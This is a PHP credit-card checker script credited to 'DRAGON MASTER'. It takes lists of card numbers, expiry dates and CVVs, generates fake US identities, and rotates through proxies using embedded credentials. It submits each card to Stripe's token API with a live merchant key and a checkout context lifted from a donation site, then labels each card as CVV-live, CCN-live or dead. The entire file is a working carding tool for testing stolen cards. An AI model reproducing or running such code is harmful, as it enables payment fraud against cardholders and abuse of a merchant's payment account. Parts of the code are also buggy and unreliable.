<?php

//=============================================================//
//================[Made By :- [🇮🇳]DRAGON MASTER]===============//
//============[Join OUR TEAM   @DragonBin + @DRAGONCCCHECKER]==//



//================[Functions and Variables]================//
require 'function.php';

error_reporting(0);
date_default_timezone_set('Asia/Jakarta');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();

$number1 = substr($ccn,0,4);
$number2 = substr($ccn,4,4);
$number3 = substr($ccn,8,4);
$number4 = substr($ccn,12,4);
$number6 = substr($ccn,0,6);

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}
//================[Functions and Variables]================//


//==================[Randomizing Details]======================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);
$firstname = value($resposta, '"first":"', '"');
$lastname = value($resposta, '"last":"', '"');
$phone = value($resposta, '"phone":"', '"');
$zip = value($resposta, '"postcode":', ',');
$postcode = value($resposta, '"postcode":', ',');
$state = value($resposta, '"state":"', '"');
$email = value($resposta, '"email":"', '"');
$city = value($resposta, '"city":"', '"');
$street = value($resposta, '"street":"', '"');
$numero1 = substr($phone, 1,3);
$numero2 = substr($phone, 6,3);
$numero3 = substr($phone, 10,4);
$phone = $numero1.''.$numero2.''.$numero3;
$serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email= str_replace("example.com", $serv_rnd, $email);
if($state=="Alabama"){ $state="AL";
}else if($state=="alaska"){ $state="AK";
}else if($state=="arizona"){ $state="AR";
}else if($state=="california"){ $state="CA";
}else if($state=="olorado"){ $state="CO";
}else if($state=="connecticut"){ $state="CT";
}else if($state=="delaware"){ $state="DE";
}else if($state=="district of columbia"){ $state="DC";
}else if($state=="florida"){ $state="FL";
}else if($state=="georgia"){ $state="GA";
}else if($state=="hawaii"){ $state="HI";
}else if($state=="idaho"){ $state="ID";
}else if($state=="illinois"){ $state="IL";
}else if($state=="indiana"){ $state="IN";
}else if($state=="iowa"){ $state="IA";
}else if($state=="kansas"){ $state="KS";
}else if($state=="kentucky"){ $state="KY";
}else if($state=="louisiana"){ $state="LA";
}else if($state=="maine"){ $state="ME";
}else if($state=="maryland"){ $state="MD";
}else if($state=="massachusetts"){ $state="MA";
}else if($state=="michigan"){ $state="MI";
}else if($state=="minnesota"){ $state="MN";
}else if($state=="mississippi"){ $state="MS";
}else if($state=="missouri"){ $state="MO";
}else if($state=="montana"){ $state="MT";
}else if($state=="nebraska"){ $state="NE";
}else if($state=="nevada"){ $state="NV";
}else if($state=="new hampshire"){ $state="NH";
}else if($state=="new jersey"){ $state="NJ";
}else if($state=="new mexico"){ $state="NM";
}else if($state=="new york"){ $state="LA";
}else if($state=="north carolina"){ $state="NC";
}else if($state=="north dakota"){ $state="ND";
}else if($state=="Ohio"){ $state="OH";
}else if($state=="oklahoma"){ $state="OK";
}else if($state=="oregon"){ $state="OR";
}else if($state=="pennsylvania"){ $state="PA";
}else if($state=="rhode Island"){ $state="RI";
}else if($state=="south carolina"){ $state="SC";
}else if($state=="south dakota"){ $state="SD";
}else if($state=="tennessee"){ $state="TN";
}else if($state=="texas"){ $state="TX";
}else if($state=="utah"){ $state="UT";
}else if($state=="vermont"){ $state="VT";
}else if($state=="virginia"){ $state="VA";
}else if($state=="washington"){ $state="WA";
}else if($state=="west virginia"){ $state="WV";
}else if($state=="wisconsin"){ $state="WI";
}else if($state=="wyoming"){ $state="WY";
}else{$state="KY";} 

//==============[Randomizing Details-END]======================//

//==================[BIN LOOK-UP]======================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank1 = GetStr($fim, '"bank":{"name":"', '"');
$name2 = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$emoji = GetStr($fim, '"emoji":"', '"');
$name1 = "".$name2."".$emoji."";
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
$currency = GetStr($fim, '"currency":"', '"');
if(strpos($fim, '"type":"credit"') !== false){
}
curl_close($ch);
//==================[BIN LOOK-UP-END]======================//


//==================[BIN LOOK-UP]======================//
$ch = curl_init();
$bin = substr($cc, 0,6);
curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/'.$bin.'/');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bindata = curl_exec($ch);
$binna = json_decode($bindata,true);
$brand = $binna['scheme'];
$country = $binna['country']['name'];
$type = $binna['type'];
$bank = $binna['bank']['name'];
curl_close($ch);
//==================[BIN LOOK-UP-END]======================//

//=======================[Proxys]=============================//
$rp1 = array(
  1 => 'hswtuhxo-rotate:g0iaxto4n9bu', /// [ex :- igapfgvg-rotate:4spo27fv5idh]
  2 => 'nctgpibx-rotate:r9urs4nd7sjq',
    ); 
    $rpt = array_rand($rp1);
    $rotate = $rp1[$rpt];


$ip = array(
  2 => 'http://p.webshare.io:80',
    ); 
    $socks = array_rand($ip);
    $socks5 = $ip[$socks];

$url = "https://api.ipify.org/";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();
if (isset($ip1)){
$ip = "Proxy live";
}
if (empty($ip1)){
$ip = "Proxy Dead:[".$rotate."]";
}

//echo '[ IP: '.$ip.' ] ';
//=======================[Proxys END]=============================//


//=======================[1 REQ]==================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'method: POST',
'path: /v1/tokens',
'scheme: https',
'accept: application/json',
'accept-language: en-US',
'content-type: application/x-www-form-urlencoded',
'origin: https://checkout.stripe.com',
'referer: https://checkout.stripe.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

# ----------------- [1req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$email.'&validation_type=card&payment_user_agent=Stripe+Checkout+v3+(stripe.js%2F78ef418)&user_agent=Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F99.0.4844.51+Safari%2F537.36&device_id=4fa5735f-5963-4e9e-9bc4-919b1befedc7&referrer=https%3A%2F%2Fwww.freeandwilling.com%2Ftransactions%2Fnew%3Fitem%3D12006&pasted_fields=number&time_checkout_opened=1646949361&time_checkout_loaded=1646949359&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[name]=Infoff%40tablig.net&time_on_page=59968&guid=3b66fe57-b81e-44b6-b105-89417b526ef56a02ea&muid=38d9be5d-a54c-4e3e-a1f7-a2768d196779154f94&sid=53cbca6e-752f-46ba-9c53-478640f9fc9088c568&key=pk_live_mVAaIghclsy3joMFdBLOpPJ2');

$result = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));
$info = curl_getinfo($ch);
$time = $info['total_time'];


//=======================[MADE BY]==============================//

$MADEBY = "[ (🇮🇳)DRAGON MASTER ]";

//[You Have  To Change Name Here Automatically In All Response Will Change ]//

//=======================[MADE BY]==============================//


//=======================[Responses]==============================//

# - [CVV Responses ] - #

if ((strpos($result, '"cvc_check":"pass"')) || (strpos($result, "Thank You.")) || (strpos($result, 'Your card zip code is incorrect.')) || (strpos($result, "Thank You For Donation.")) || (strpos($result, "incorrect_zip")) || (strpos($result, "Success ")) || (strpos($result, '"type":"one-time"')) || (strpos($result, "/donations/thank_you?donation_number="))){
    echo '<br><span class="badge badge-success">#CVV ✓ </span> : ' . $lista . ' ➜  CVV PASS ➜ </span> ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
}

elseif ((strpos($result, "Your card has insufficient funds.")) || (strpos($result, '"cvc_check": "fail"'))){
    echo '<br><span class="badge badge-success">#CVV ✓ </span> : ' . $lista . ' ➜ R ➜ Your card has insufficient funds.  ➜ ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
}

# - [CVV Responses ] - #


# - [CCN Responses ] - #

elseif ((strpos($result, 'security code is incorrect.')) || (strpos($result, "security code is invalid.")) || (strpos($result, "Your card's security code is incorrect.")) || (strpos($result, "incorrect_cvc"))){
    echo '<br><span class="badge badge-warning">#CCN ✓ </span> : ' . $lista . ' ➜  CCN Live ➜ </span> ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';

}
#-[CCN Responses END ]- #



#- [Stolen,Lost,Pickup Responses]- #

elseif ((strpos($result, 'stolen_card')) || (strpos($result, "lost_card")) || (strpos($result, "pickup_card."))){
    echo '<br><span class="badge badge-danger">DEAD ✗ </span> : ' . $lista . ' ➜ DEAD ➜ IP: '.$ip.' ➜ ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
}


# -- [Stolen,Lost,Pickup Responses END ] - #



# -[Reprovada,Decline Responses ] - #

elseif ((strpos($result, 'card was declined')) || (strpos($result1, "generic_decline")) || (strpos($result, 'do_not_honor')) || (strpos($result1, "generic_decline")) || (strpos($result, "processing_error")) || (strpos($result, "parameter_invalid_empty")) || (strpos($result, 'lock_timeout')) || (strpos($result, "transaction_not_allowed"))){
    echo '<br><span class="badge badge-danger">DEAD ✗ </span> : ' . $lista . ' ➜ DEAD ➜ IP: '.$ip.' ➜ ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
}

elseif ((strpos($result, 'Payment cannot be processed, missing credit card number')) || (strpos($result, "missing_payment_information")) || (strpos($result, 'three_d_secure_redirect')) || (strpos($result, '"cvc_check": "unchecked"')) || (strpos($result, "service_not_allowed")) || (strpos($result, '"cvc_check": "unchecked"')) || (strpos($result, 'Your card does not support this type of purchase.')) || (strpos($result, "transaction_not_allowed"))){
    echo '<br><span class="badge badge-danger">DEAD ✗ </span> : ' . $lista . ' ➜ DEAD ➜ IP: '.$ip.' ➜ ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
}

elseif (strpos($result1,  'Your card has expired.')) {
  echo '<br><span class="badge badge-danger">DEAD ✗ </span> : ' . $lista . ' ➜ R ➜ Your card has expired. ➜:  DEAD ➜ IP: '.$ip.' ➜ ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
}

elseif (strpos($result1,  'Your card number is incorrect.')) {
  echo '<br><span class="badge badge-danger">DEAD ✗ </span> : ' . $lista . ' ➜ R ➜ Your card number is incorrect. ➜  DEAD ➜ IP: '.$ip.' ➜ ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
}

# - [Reprovada,Decline Responses END ] - #



# - [UPDATE,PROXY DEAD , CC CHECKER DEAD Responses ] - #
elseif 
(strpos($result1,  '-1')) {
    echo '<br><span class="badge badge-danger">DEAD ✗ </span> : ' . $lista . ' ➜ R ➜ Update Nonce ➜ DEAD ➜ IP: '.$ip.' ➜ ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
}

else {
    echo '<br><span class="badge badge-danger">DEAD ✗ </span> : ' . $lista . ' ➜ R ➜ Dead Proxy/Error Not listed/CC Checker Dead. ➜ DEAD ➜ IP: '.$ip.' ➜ ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
}
# - [UPDATE,PROXY DEAD , CC CHECKER DEAD Responses END ] - #
//=======================[Responses-END]==============================//


curl_close($ch);
ob_flush();

echo "<b>1REQ Result:</b> $result<br><br>";


//=============================================================//
//================[Made By :- [🇮🇳]DRAGON MASTER]===============//
//============[Join OUR TEAM   @DragonBin + @DRAGONCCCHECKER]==//
?>
